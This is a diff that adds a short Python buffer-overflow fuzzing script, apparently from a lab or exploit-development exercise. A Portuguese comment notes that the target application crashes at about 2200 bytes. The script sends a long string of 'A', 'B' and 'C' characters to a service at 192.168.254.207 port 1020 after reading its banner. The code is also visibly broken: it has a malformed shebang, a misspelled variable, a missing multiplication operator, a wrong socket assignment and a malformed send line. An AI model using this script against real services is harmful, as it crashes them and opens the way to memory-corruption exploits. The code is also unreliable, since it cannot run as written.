@@ -1,0 +1,11 @@
+#/usr/bin/python
+import socket
+
+#A aplicação quebra em 2200, entao a ideia é ir quebrando até chegar #no numero exato que a aplicação quebra
+
+daods = "A" * 2000 + "B" * 100 + "C" 100
+
+s.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.254.207", 1020))
+banner = s.recv(1024)
+s.send("SEND "+dados"\r\n")
